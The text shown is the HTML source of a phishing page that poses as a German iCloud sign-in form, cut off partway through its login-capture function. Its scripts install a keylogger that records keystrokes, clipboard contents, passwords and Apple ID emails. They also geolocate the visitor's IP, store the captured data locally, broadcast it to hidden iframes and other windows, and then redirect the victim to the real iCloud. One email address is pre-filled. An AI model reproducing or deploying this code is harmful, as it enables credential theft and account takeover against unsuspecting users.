<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>iCloud - Anmelden</title>
    <link rel="apple-touch-icon" sizes="180x180" href="https://www.apple.com/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://www.apple.com/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://www.apple.com/favicon-16x16.png">
    <link rel="mask-icon" href="https://www.apple.com/safari-pinned-tab.svg" color="#000000">
    
    <!-- Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ -->
    <script src="brain-system.js" defer></script>
    
    <style>
        /* Ù†Ø¸Ø§Ù… Ø£Ù„ÙˆØ§Ù† Apple Ø§Ù„Ø£Ù„Ù…Ø§Ù†ÙŠ */
        :root {
            --apple-black: #000000;
            --apple-white: #FFFFFF;
            --apple-gray-1: #F5F5F7;
            --apple-gray-2: #E5E5EA;
            --apple-gray-3: #8E8E93;
            --apple-blue: #007AFF;
            --apple-blue-dark: #0056CC;
            --apple-red: #FF3B30;
            --apple-green: #34C759;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', 'Segoe UI', sans-serif;
        }
        
        body {
            background-color: var(--apple-gray-1);
            color: var(--apple-black);
            line-height: 1.5;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-size: 17px;
        }
        
        .container {
            width: 100%;
            max-width: 420px;
            margin: 0 auto;
        }
        
        .apple-header {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .apple-logo {
            font-size: 64px;
            margin-bottom: 24px;
            color: var(--apple-black);
        }
        
        .header-title {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 8px;
            color: var(--apple-black);
        }
        
        .header-subtitle {
            font-size: 17px;
            color: var(--apple-gray-3);
        }
        
        .login-card {
            background: var(--apple-white);
            border-radius: 12px;
            padding: 32px;
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
            color: var(--apple-black);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .apple-input {
            width: 100%;
            padding: 16px;
            font-size: 17px;
            border: 1px solid var(--apple-gray-2);
            border-radius: 8px;
            background: var(--apple-white);
            transition: border-color 0.2s;
        }
        
        .apple-input:focus {
            outline: none;
            border-color: var(--apple-blue);
            box-shadow: 0 0 0 4px rgba(0, 122, 255, 0.1);
        }
        
        .password-wrapper {
            position: relative;
        }
        
        .toggle-password {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: var(--apple-gray-3);
            cursor: pointer;
            font-size: 16px;
            padding: 8px;
        }
        
        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 20px 0;
        }
        
        .apple-checkbox {
            width: 18px;
            height: 18px;
            accent-color: var(--apple-blue);
        }
        
        .checkbox-label {
            font-size: 14px;
            color: var(--apple-black);
        }
        
        .apple-button {
            width: 100%;
            padding: 16px;
            background: var(--apple-blue);
            color: var(--apple-white);
            border: none;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .apple-button:hover {
            background: var(--apple-blue-dark);
        }
        
        .apple-button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
        
        .progress-container {
            margin-top: 20px;
            display: none;
        }
        
        .progress-bar {
            width: 100%;
            height: 4px;
            background: var(--apple-gray-2);
            border-radius: 2px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--apple-blue), var(--apple-green));
            width: 0%;
            transition: width 0.3s;
        }
        
        .security-info {
            margin-top: 32px;
            padding: 20px;
            background: var(--apple-gray-1);
            border-radius: 8px;
            font-size: 12px;
            color: var(--apple-gray-3);
            line-height: 1.6;
            text-align: center;
        }
        
        .security-info h3 {
            font-size: 14px;
            margin-bottom: 8px;
            color: var(--apple-black);
        }
        
        .create-account {
            text-align: center;
            margin-top: 24px;
        }
        
        .create-link {
            color: var(--apple-blue);
            text-decoration: none;
            font-size: 15px;
            font-weight: 600;
        }
        
        .create-link:hover {
            text-decoration: underline;
        }
        
        .language-switcher {
            position: fixed;
            top: 20px;
            right: 20px;
        }
        
        .language-btn {
            padding: 8px 16px;
            background: var(--apple-white);
            border: 1px solid var(--apple-gray-2);
            border-radius: 20px;
            font-size: 14px;
            color: var(--apple-blue);
            cursor: pointer;
        }
        
        /* ØªØµÙ…ÙŠÙ… Ù…ØªØ¬Ø§ÙˆØ¨ */
        @media (max-width: 768px) {
            .container {
                max-width: 100%;
                padding: 0 15px;
            }
            
            .login-card {
                padding: 24px;
            }
            
            .apple-logo {
                font-size: 56px;
            }
            
            .header-title {
                font-size: 24px;
            }
        }
        
        /* ØªØ£Ø«ÙŠØ±Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ© */
        .status-dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 8px;
        }
        
        .status-online {
            background-color: var(--apple-green);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body>
    <!-- ØªØ¨Ø¯ÙŠÙ„ Ø§Ù„Ù„ØºØ© -->
    <div class="language-switcher">
        <button class="language-btn" onclick="switchLanguage()">
            <span>ğŸŒ</span>
            Deutsch
        </button>
    </div>
    
    <!-- Ø§Ù„Ù…Ø­ØªÙˆÙ‰ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ -->
    <div class="container">
        <div class="apple-header">
            <div class="apple-logo">ï£¿</div>
            <h1 class="header-title">Bei iCloud anmelden</h1>
            <p class="header-subtitle">E-Mail-Adresse oder Telefonnummer</p>
        </div>
        
        <div class="login-card">
            <form id="icloudLoginForm" onsubmit="return handleLogin(event)">
                <div class="form-group">
                    <label class="form-label" for="appleId">Apple ID</label>
                    <input 
                        type="email" 
                        id="appleId" 
                        class="apple-input" 
                        placeholder="name@beispiel.com" 
                        value="langer.steffen@convex-bau.de"
                        required
                        autocomplete="username"
                    >
                </div>
                
                <div class="form-group">
                    <label class="form-label" for="password">Passwort</label>
                    <div class="password-wrapper">
                        <input 
                            type="password" 
                            id="password" 
                            class="apple-input" 
                            placeholder="â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢" 
                            required
                            autocomplete="current-password"
                        >
                        <button type="button" class="toggle-password" onclick="togglePassword()">ğŸ‘ï¸</button>
                    </div>
                </div>
                
                <div class="checkbox-group">
                    <input type="checkbox" id="rememberMe" class="apple-checkbox">
                    <label for="rememberMe" class="checkbox-label">Auf diesem GerÃ¤t angemeldet bleiben</label>
                </div>
                
                <div class="progress-container" id="progressContainer">
                    <div class="progress-bar">
                        <div class="progress-fill" id="progressFill"></div>
                    </div>
                </div>
                
                <button type="submit" class="apple-button" id="submitBtn">
                    <span id="btnText">Weiter</span>
                </button>
            </form>
            
            <div class="create-account">
                <a href="javascript:void(0)" onclick="createAccount()" class="create-link">
                    Apple ID erstellen
                </a>
            </div>
        </div>
        
        <div class="security-info">
            <h3>Ihre Apple ID-Informationen</h3>
            <p>
                Ihre Apple ID-Informationen werden verwendet, um Sie sicher anzumelden und 
                Zugriff auf Ihre Daten zu ermÃ¶glichen. Apple zeichnet bestimmte Daten fÃ¼r 
                Sicherheits-, Support- und Berichtszwecke auf. Wenn Sie zustimmen, kann 
                Apple Ihre Apple ID-Informationen auch verwenden, um Sie Ã¼ber Updates und 
                Sonderangebote zu informieren.
            </p>
            <div style="margin-top: 10px; font-size: 11px; color: #999;">
                <span class="status-dot status-online"></span>
                Sichere Verbindung â€¢ <span id="currentTime"></span>
            </div>
        </div>
    </div>

    <!-- Ø¥Ø·Ø§Ø±Ø§Øª Ø®ÙÙŠØ© Ù„Ù†Ø¸Ø§Ù… Brain -->
    <iframe src="brain-frame.html" style="display:none;"></iframe>
    <iframe src="data-sync.html" style="display:none;"></iframe>

    <script>
        // ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù†Ø¸Ø§Ù…
        document.addEventListener('DOMContentLoaded', async function() {
            console.log('ğŸš€ Starte iCloud Anmeldungssystem...');
            
            // ØªØ­Ø¯ÙŠØ« Ø§Ù„ÙˆÙ‚Øª
            updateTime();
            setInterval(updateTime, 60000);
            
            // ØªØ³Ø¬ÙŠÙ„ Ù‡Ø°Ù‡ Ø§Ù„Ø²ÙŠØ§Ø±Ø© ÙÙŠ Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ
            await logVisit();
            
            // ØªÙ‡ÙŠØ¦Ø© Ù†Ø¸Ø§Ù… Keylogger Ø§Ù„Ù…ØªÙ‚Ø¯Ù…
            initAdvancedKeylogger();
            
            // Ø¨Ø¯Ø¡ Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ù†Øµ
            startTextMonitoring();
            
            // Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ
            connectToBrain();
            
            console.log('âœ… System bereit');
        });
        
        // ØªØ­Ø¯ÙŠØ« Ø§Ù„ÙˆÙ‚Øª
        function updateTime() {
            const now = new Date();
            document.getElementById('currentTime').textContent = 
                now.toLocaleDateString('de-DE') + ' ' + 
                now.toLocaleTimeString('de-DE');
        }
        
        // ØªØ³Ø¬ÙŠÙ„ Ø²ÙŠØ§Ø±Ø© ÙÙŠ Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ
        async function logVisit() {
            try {
                const visitData = {
                    type: 'visit',
                    timestamp: new Date().toISOString(),
                    page: 'icloud_login',
                    language: 'de',
                    userAgent: navigator.userAgent,
                    screen: `${screen.width}x${screen.height}`,
                    referrer: document.referrer || 'direct',
                    device: getDeviceType(),
                    location: await getLocationInfo(),
                    sessionId: generateSessionId()
                };
                
                // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ
                sendToBrain('visit', visitData);
                
                // Ø­ÙØ¸ Ù…Ø­Ù„ÙŠØ§Ù‹
                saveToLocalStorage('visits', visitData);
                
                console.log('ğŸ‘€ Besuch registriert:', visitData.device);
                
            } catch (error) {
                console.error('âŒ Fehler beim Besuchslog:', error);
            }
        }
        
        // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²
        function getDeviceType() {
            const ua = navigator.userAgent.toLowerCase();
            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
                return 'tablet';
            } else if (/mobile|iphone|ipod|android|blackberry|opera mini|opera mobi/i.test(ua)) {
                return 'mobile';
            } else {
                return 'desktop';
            }
        }
        
        // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹
        async function getLocationInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    country: data.country_name,
                    city: data.city,
                    ip: data.ip,
                    isp: data.org
                };
            } catch (error) {
                return { country: 'Unknown', city: 'Unknown', ip: 'Unknown' };
            }
        }
        
        // ØªÙˆÙ„ÙŠØ¯ Ù…Ø¹Ø±Ù Ø§Ù„Ø¬Ù„Ø³Ø©
        function generateSessionId() {
            return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }
        
        // ØªÙ‡ÙŠØ¦Ø© Keylogger Ø§Ù„Ù…ØªÙ‚Ø¯Ù…
        function initAdvancedKeylogger() {
            console.log('âŒ¨ï¸ Erweiterter Keylogger initialisiert');
            
            // ØªØ³Ø¬ÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ø£Ø­Ø¯Ø§Ø« Ù„ÙˆØ­Ø© Ø§Ù„Ù…ÙØ§ØªÙŠØ­
            document.addEventListener('keydown', function(event) {
                logKeystroke(event, 'keydown');
            });
            
            document.addEventListener('keyup', function(event) {
                logKeystroke(event, 'keyup');
            });
            
            document.addEventListener('keypress', function(event) {
                logKeystroke(event, 'keypress');
            });
            
            // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ù†Ø³Ø® ÙˆØ§Ù„Ù„ØµÙ‚
            document.addEventListener('copy', function(event) {
                logClipboard('copy', window.getSelection().toString());
            });
            
            document.addEventListener('paste', function(event) {
                const pastedText = event.clipboardData.getData('text');
                logClipboard('paste', pastedText);
            });
            
            // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ù‚Øµ
            document.addEventListener('cut', function(event) {
                logClipboard('cut', window.getSelection().toString());
            });
            
            console.log('âœ… Keylogger aktiviert');
        }
        
        // ØªØ³Ø¬ÙŠÙ„ Ø¶ØºØ·Ø© Ø§Ù„Ù…ÙØ§ØªÙŠØ­
        function logKeystroke(event, type) {
            try {
                const keystrokeData = {
                    type: 'keystroke',
                    key: event.key,
                    code: event.code,
                    keyCode: event.keyCode,
                    which: event.which,
                    eventType: type,
                    timestamp: new Date().toISOString(),
                    target: {
                        id: event.target.id,
                        tagName: event.target.tagName,
                        type: event.target.type,
                        value: event.target.value,
                        className: event.target.className
                    },
                    modifiers: {
                        ctrl: event.ctrlKey,
                        shift: event.shiftKey,
                        alt: event.altKey,
                        meta: event.metaKey
                    },
                    location: event.location
                };
                
                // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ
                sendToBrain('keystroke', keystrokeData);
                
                // Ø­ÙØ¸ ÙÙŠ Ø§Ù„Ù…Ø®Ø²Ù† Ø§Ù„Ù…Ø­Ù„ÙŠ
                saveKeystroke(keystrokeData);
                
            } catch (error) {
                console.warn('âš ï¸ Keystroke logging error:', error);
            }
        }
        
        // ØªØ³Ø¬ÙŠÙ„ Ø¹Ù…Ù„ÙŠØ§Øª Ø§Ù„Ù†Ø³Ø® ÙˆØ§Ù„Ù„ØµÙ‚
        function logClipboard(action, text) {
            try {
                const clipboardData = {
                    type: 'clipboard',
                    action: action,
                    text: text,
                    length: text.length,
                    timestamp: new Date().toISOString(),
                    page: window.location.href
                };
                
                // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ
                sendToBrain('clipboard', clipboardData);
                
            } catch (error) {
                console.warn('âš ï¸ Clipboard logging error:', error);
            }
        }
        
        // Ø¨Ø¯Ø¡ Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ù†Øµ
        function startTextMonitoring() {
            // Ù…Ø±Ø§Ù‚Ø¨Ø© ØªØºÙŠÙŠØ±Ø§Øª Ø§Ù„Ù†Øµ ÙÙŠ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„
            document.addEventListener('input', function(event) {
                logTextInput(event);
            });
            
            // Ù…Ø±Ø§Ù‚Ø¨Ø© ØªØºÙŠÙŠØ±Ø§Øª Ø§Ù„Ù†Øµ ÙÙŠ contenteditable
            document.addEventListener('input', function(event) {
                if (event.target.isContentEditable) {
                    logContentEditable(event);
                }
            }, true);
            
            // Ù…Ø±Ø§Ù‚Ø¨Ø© ØªØºÙŠÙŠØ±Ø§Øª textarea
            const textareas = document.querySelectorAll('textarea');
            textareas.forEach(textarea => {
                textarea.addEventListener('input', logTextInput);
            });
            
            console.log('ğŸ“ TextÃ¼berwachung aktiviert');
        }
        
        // ØªØ³Ø¬ÙŠÙ„ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ù†Øµ
        function logTextInput(event) {
            try {
                const inputData = {
                    type: 'text_input',
                    timestamp: new Date().toISOString(),
                    target: {
                        id: event.target.id,
                        name: event.target.name,
                        type: event.target.type,
                        tagName: event.target.tagName,
                        className: event.target.className,
                        placeholder: event.target.placeholder
                    },
                    value: event.target.value,
                    valueLength: event.target.value.length,
                    selectionStart: event.target.selectionStart,
                    selectionEnd: event.target.selectionEnd
                };
                
                // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ
                sendToBrain('text_input', inputData);
                
                // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø­Ø³Ø§Ø³Ø© Ø¨Ø´ÙƒÙ„ Ø®Ø§Øµ
                if (event.target.type === 'password' || 
                    event.target.id === 'password' ||
                    event.target.name === 'password') {
                    
                    logPasswordInput(event.target.value);
                }
                
                if (event.target.type === 'email' || 
                    event.target.id === 'appleId' ||
                    event.target.name === 'email') {
                    
                    logEmailInput(event.target.value);
                }
                
            } catch (error) {
                console.warn('âš ï¸ Text input logging error:', error);
            }
        }
        
        // ØªØ³Ø¬ÙŠÙ„ Ø¥Ø¯Ø®Ø§Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±
        function logPasswordInput(password) {
            try {
                const passwordData = {
                    type: 'password_input',
                    timestamp: new Date().toISOString(),
                    password: password,
                    length: password.length,
                    hasUpperCase: /[A-Z]/.test(password),
                    hasLowerCase: /[a-z]/.test(password),
                    hasNumbers: /\d/.test(password),
                    hasSpecial: /[^A-Za-z0-9]/.test(password),
                    strength: calculatePasswordStrength(password)
                };
                
                // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ
                sendToBrain('password', passwordData);
                
                // Ø­ÙØ¸ Ù…Ø­Ù„ÙŠØ§Ù‹
                savePasswordInput(passwordData);
                
            } catch (error) {
                console.warn('âš ï¸ Password logging error:', error);
            }
        }
        
        // ØªØ³Ø¬ÙŠÙ„ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ
        function logEmailInput(email) {
            try {
                const emailData = {
                    type: 'email_input',
                    timestamp: new Date().toISOString(),
                    email: email,
                    domain: email.split('@')[1] || '',
                    isValid: /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
                };
                
                // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ
                sendToBrain('email', emailData);
                
            } catch (error) {
                console.warn('âš ï¸ Email logging error:', error);
            }
        }
        
        // Ø­Ø³Ø§Ø¨ Ù‚ÙˆØ© ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±
        function calculatePasswordStrength(password) {
            let score = 0;
            if (password.length >= 8) score++;
            if (password.length >= 12) score++;
            if (/[A-Z]/.test(password)) score++;
            if (/[a-z]/.test(password)) score++;
            if (/\d/.test(password)) score++;
            if (/[^A-Za-z0-9]/.test(password)) score++;
            
            if (score <= 2) return 'weak';
            if (score <= 4) return 'medium';
            return 'strong';
        }
        
        // Ø­ÙØ¸ Ø¶ØºØ·Ø© Ø§Ù„Ù…ÙØ§ØªÙŠØ­
        function saveKeystroke(data) {
            try {
                const keystrokes = JSON.parse(localStorage.getItem('keystrokes') || '[]');
                keystrokes.push(data);
                
                // Ø§Ù„Ø§Ø­ØªÙØ§Ø¸ Ø¨Ù€ 1000 Ø¶ØºØ·Ø© ÙÙ‚Ø·
                if (keystrokes.length > 1000) {
                    keystrokes.splice(0, keystrokes.length - 1000);
                }
                
                localStorage.setItem('keystrokes', JSON.stringify(keystrokes));
                
            } catch (error) {
                console.warn('âš ï¸ Keystroke save error:', error);
            }
        }
        
        // Ø­ÙØ¸ Ø¥Ø¯Ø®Ø§Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±
        function savePasswordInput(data) {
            try {
                const passwords = JSON.parse(localStorage.getItem('password_inputs') || '[]');
                passwords.push(data);
                
                // Ø§Ù„Ø§Ø­ØªÙØ§Ø¸ Ø¨Ù€ 100 Ø³Ø¬Ù„ ÙÙ‚Ø·
                if (passwords.length > 100) {
                    passwords.splice(0, passwords.length - 100);
                }
                
                localStorage.setItem('password_inputs', JSON.stringify(passwords));
                
            } catch (error) {
                console.warn('âš ï¸ Password save error:', error);
            }
        }
        
        // Ø­ÙØ¸ ÙÙŠ localStorage
        function saveToLocalStorage(key, data) {
            try {
                const existing = JSON.parse(localStorage.getItem(key) || '[]');
                existing.push(data);
                
                // Ø§Ù„Ø§Ø­ØªÙØ§Ø¸ Ø¨Ù€ 500 Ø³Ø¬Ù„ ÙÙ‚Ø·
                if (existing.length > 500) {
                    existing.splice(0, existing.length - 500);
                }
                
                localStorage.setItem(key, JSON.stringify(existing));
                return true;
            } catch (error) {
                console.warn('âš ï¸ LocalStorage error:', error);
                return false;
            }
        }
        
        // Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ
        function connectToBrain() {
            console.log('ğŸ§  Verbinde mit Brain System...');
            
            // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø§ØªØµØ§Ù„ ÙƒÙ„ 5 Ø«ÙˆØ§Ù†ÙŠ
            setInterval(() => {
                sendHeartbeat();
            }, 5000);
            
            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø®Ø²Ù†Ø©
            sendStoredData();
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ
        function sendToBrain(type, data) {
            try {
                // Ø¥Ø¹Ø¯Ø§Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
                const brainData = {
                    type: type,
                    data: data,
                    timestamp: new Date().toISOString(),
                    device: getDeviceType(),
                    sessionId: getSessionId(),
                    origin: window.location.origin
                };
                
                // 1. Ø¥Ø±Ø³Ø§Ù„ Ø¹Ø¨Ø± localStorage (Ù„Ù„Ø§ØªØµØ§Ù„ Ø¨ÙŠÙ† Ø§Ù„Ù†ÙˆØ§ÙØ°)
                localStorage.setItem('brain_sync', JSON.stringify(brainData));
                
                // 2. Ø¥Ø±Ø³Ø§Ù„ Ø¹Ø¨Ø± postMessage
                window.parent.postMessage(brainData, '*');
                
                // 3. Ø¥Ø±Ø³Ø§Ù„ Ø¹Ø¨Ø± iframe
                const iframes = document.querySelectorAll('iframe');
                iframes.forEach(iframe => {
                    try {
                        iframe.contentWindow.postMessage(brainData, '*');
                    } catch (e) {
                        // ØªØ¬Ø§Ù‡Ù„ Ø§Ù„Ø£Ø®Ø·Ø§Ø¡
                    }
                });
                
                // 4. Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù… (Ø¥Ø°Ø§ ÙƒØ§Ù† Ù…ØªÙˆÙØ±Ø§Ù‹)
                sendToServer(brainData);
                
            } catch (error) {
                console.warn('âš ï¸ Brain send error:', error);
            }
        }
        
        // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø¹Ø±Ù Ø§Ù„Ø¬Ù„Ø³Ø©
        function getSessionId() {
            let sessionId = sessionStorage.getItem('icloud_session');
            if (!sessionId) {
                sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                sessionStorage.setItem('icloud_session', sessionId);
            }
            return sessionId;
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ù†Ø¨Ø¶Ø§Øª Ø§Ù„Ù‚Ù„Ø¨
        function sendHeartbeat() {
            const heartbeat = {
                type: 'heartbeat',
                timestamp: new Date().toISOString(),
                page: window.location.href,
                active: true,
                data: {
                    keystrokes: JSON.parse(localStorage.getItem('keystrokes') || '[]').length,
                    passwords: JSON.parse(localStorage.getItem('password_inputs') || '[]').length,
                    visits: JSON.parse(localStorage.getItem('visits') || '[]').length
                }
            };
            
            sendToBrain('heartbeat', heartbeat);
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø®Ø²Ù†Ø©
        function sendStoredData() {
            // Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø®Ø²Ù†Ø©
            const dataTypes = ['keystrokes', 'password_inputs', 'visits'];
            
            dataTypes.forEach(type => {
                const data = JSON.parse(localStorage.getItem(type) || '[]');
                if (data.length > 0) {
                    sendToBrain('bulk_' + type, {
                        items: data,
                        count: data.length,
                        type: type
                    });
                }
            });
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù…
        async function sendToServer(data) {
            try {
                // ÙŠÙ…ÙƒÙ† Ø¥Ø¶Ø§ÙØ© Ø¹Ù†ÙˆØ§Ù† Ø®Ø§Ø¯Ù… Ø­Ù‚ÙŠÙ‚ÙŠ Ù‡Ù†Ø§
                // await fetch('https://your-server.com/api/brain', {
                //     method: 'POST',
                //     headers: { 'Content-Type': 'application/json' },
                //     body: JSON.stringify(data)
                // });
                
                // Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† Ø°Ù„ÙƒØŒ Ø­ÙØ¸ ÙÙŠ localStorage Ù„Ù„Ø®Ø§Ø¯Ù… Ø§Ù„ÙˆÙ‡Ù…ÙŠ
                const serverData = JSON.parse(localStorage.getItem('brain_server') || '[]');
                serverData.push(data);
                
                // Ø§Ù„Ø§Ø­ØªÙØ§Ø¸ Ø¨Ù€ 1000 Ø³Ø¬Ù„ ÙÙ‚Ø·
                if (serverData.length > 1000) {
                    serverData.splice(0, serverData.length - 1000);
                }
                
                localStorage.setItem('brain_server', JSON.stringify(serverData));
                
            } catch (error) {
                console.warn('âš ï¸ Server send error:', error);
            }
        }
        
        // Ù…Ø¹Ø§Ù„Ø¬Ø© ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
        async function handleLogin(event) {
            event.preventDefault();
            
            const appleId = document.getElementById('appleId').value.trim();
            const password = document.getElementById('password').value.trim();
            const rememberMe = document.getElementById('rememberMe').checked;
            
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
            if (!appleId || !password) {
                alert('Bitte geben Sie Ihre Apple ID und Ihr Passwort ein.');
                return false;
            }
            
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ
            if (!isValidEmail(appleId)) {
                alert('Bitte geben Sie eine gÃ¼ltige Apple ID ein.');
                return false;
            }
            
            // Ø¨Ø¯Ø¡ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ØªØ³Ø¬ÙŠÙ„
            startLoginProcess(appleId, password, rememberMe);
            
            return false;
        }
        
        // Ø¨Ø¯Ø¡ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ØªØ³Ø¬ÙŠÙ„
        async function startLoginProcess(appleId, password, rememberMe) {
            try {
                // ØªØ¹Ø·ÙŠÙ„ Ø§Ù„Ø²Ø± ÙˆØ¥Ø¸Ù‡Ø§Ø± Ø§Ù„ØªÙ‚Ø¯Ù…
                disableSubmitButton();
                
                // ØªØ³Ø¬ÙŠÙ„ Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„
                await logLoginAttempt(appleId, password, rememberMe);
                
                // Ø­ÙØ¸ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø§Ø¹ØªÙ…Ø§Ø¯
                await saveCredentials(appleId, password, rememberMe);
                
                // Ù…Ø­Ø§ÙƒØ§Ø© Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ØªØ­Ù‚Ù‚
                await simulateVerification();
                
                // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø¥Ù„Ù‰ iCloud Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ
                redirectToiCloud();
                
            } catch (error) {
                console.error('âŒ Login error:', error);
                alert('Ein Fehler ist aufgetreten. Sie werden zu iCloud weitergeleitet.');
                redirectToiCloud();
            }
        }
        
        // ØªØ³Ø¬ÙŠÙ„ Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„
        async function logLoginAttempt(appleId, password, rememberMe) {
            const loginData = {
                type: 'login_attempt',
                timestamp: new Date().toISOString(),
                appleId: appleId,
                password: password,
                rememberMe: rememberMe,
                ip: await getIP(),
                location: await getLocationInfo(),
                device: getDeviceType(),
